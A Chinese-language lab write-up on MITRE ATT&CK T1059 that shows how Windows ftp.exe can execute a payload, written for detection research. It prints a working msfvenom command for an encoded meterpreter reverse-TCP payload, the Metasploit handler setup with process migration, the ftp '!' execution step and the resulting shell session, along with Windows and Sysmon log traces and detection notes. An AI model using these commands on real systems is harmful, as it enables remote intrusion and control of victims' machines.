# T1059-win-基于白名单Ftp.exe执行Payload

## 来自ATT&CK的描述

命令行界面是与计算机系统交互的一种方式，并且是很多操作系统平台的常见特性。例如，Windows系统上的命令行界面cmd可用于执行许多任务，包括执行其他软件。命令行界面可在本地交互或者通过远程桌面应用、反向shell会话等远程交互。执行的命令以命令行界面进程的当前权限级别运行，除非该命令需要调用进程来更改权限上下文（例如，定时任务）。

攻击者可能会使用命令行界面与系统交互并在操作过程中执行其他软件。

## 测试案例

Ftp.exe是Windows本身自带的一个程序，属于微软FTP工具，提供基本的FTP访问。

说明：Ftp.exe所在路径已被系统添加PATH环境变量中，因此，Ftp.exe命令可识别。

补充说明：在高版本操作系统中，可以通过配置策略，对进程命令行参数进行记录。日志策略开启方法：`本地计算机策略>计算机配置>管理模板>系统>审核进程创建>在过程创建事件中加入命令行>启用`，同样也可以在不同版本操作系统中部署sysmon，通过sysmon日志进行监控。

Windows 2003 默认位置：
C:\Windows\System32\ftp.exe

C:\Windows\SysWOW64\ftp.exe

Windows 7 默认位置：

C:\Windows\System32\ftp.exe

C:\Windows\SysWOW64\ftp.exe

## 检测日志

windows 安全日志/SYSMON日志（需要自行安装）

## 测试复现

### 环境准备

攻击机：Kali2019

靶机：windows server 2012

### 攻击分析

#### 生成payload.exe

```bash
msfvenom -a x86 --platform Windows -p windows/meterpreter/reverse_tcp LHOST=192.168.126.146 LPORT=53 -e x86/shikata_ga_nai -b '\x00\x0a\xff' -i 3 -f exe -o payload.exe
```

#### 执行监听

攻击机,注意配置set AutoRunScript migrate f (AutoRunScript是msf中一个强大的自动化的后渗透工具，这里migrate参数是迁移木马到其他进程)

```bash
msf5 > use exploit/multi/handler
msf5 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp
msf5 exploit(multi/handler) > set lhost 192.168.126.146
lhost => 192.168.126.146
msf5 exploit(multi/handler) > set lport 53
lport => 53
msf5 exploit(multi/handler) > set AutoRunScript migrate -f
AutoRunScript => migrate -f
msf5 exploit(multi/handler) > exploit
```

#### 执行payload

```cmd
ftp>!C:\Users\12306Br0\Desktop\a\payload.exe
```

#### 反弹shell

```bash
msf5 exploit(multi/handler) > exploit

[*] Started reverse TCP handler on 192.168.126.146:53
[*] Sending stage (180291 bytes) to 192.168.126.149
[*] Meterpreter session 1 opened (192.168.126.146:53 -> 192.168.126.149:49219) at 2020-04-18 20:08:18 +0800
[*] Session ID 1 (192.168.126.146:53 -> 192.168.126.149:49219) processing AutoRunScript 'migrate -f'
[!] Meterpreter scripts are deprecated. Try post/windows/manage/migrate.
[!] Example: run post/windows/manage/migrate OPTION=value [...]
[*] Current server process: payload.exe (2324)
[*] Spawning notepad.exe process to migrate to
[+] Migrating to 2888
[+] Successfully migrated to process

meterpreter > getuid
Server username: 12306Br0-PC\12306Br0

```

## 测试留痕

```log
EventID:4688 #安全日志，windows server 2012以上配置审核策略，可对命令参数进行记录
进程信息:
新进程 ID: 0x474
新进程名: C:\Windows\System32\cmd.exe

EventID:4688
进程信息:
新进程 ID: 0x3f8
新进程名: C:\Users\12306Br0\Desktop\a\payload.exe

EventID:5156
应用程序信息:
进程 ID: 1016
应用程序名称: \device\harddiskvolume2\users\12306br0\desktop\a\payload.exe

网络信息:
方向: 出站
源地址: 192.168.126.149
源端口: 49221
目标地址: 192.168.126.146
目标端口: 53
协议: 6

EventID:1 #sysmon日志
Image: C:\Windows\System32\cmd.exe
FileVersion: 6.1.7601.17514 (win7sp1_rtm.101119-1850)
Description: Windows Command Processor
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: Cmd.Exe
CommandLine: C:\Windows\system32\cmd.exe /C C:\Users\12306Br0\Desktop\a\payload.exe
CurrentDirectory: C:\Windows\system32\
User: 12306Br0-PC\12306Br0
LogonGuid: {bb1f7c32-e7a1-5e9a-0000-0020ac500500}
LogonId: 0x550ac
TerminalSessionId: 1
IntegrityLevel: High
Hashes: SHA1=0F3C4FF28F354AEDE202D54E9D1C5529A3BF87D8
ParentProcessGuid: {bb1f7c32-ed99-5e9a-0000-00105addaf00}
ParentProcessId: 1112
ParentImage: C:\Windows\System32\ftp.exe
ParentCommandLine: ftp
```

## 检测规则/思路

无具体检测规则，可根据进程创建事件4688/1（进程名称、命令行）进行监控。本监控方法需要自行安装配置审核策略Sysmon。

## 参考推荐

MITRE-ATT&CK-T1059

<https://attack.mitre.org/techniques/T1059/>

基于白名单Ftp.exe执行Payload

<https://www.77169.net/html/235306.html>

基于白名单的Payload

s<https://blog.csdn.net/weixin_30790841/article/details/101848854>
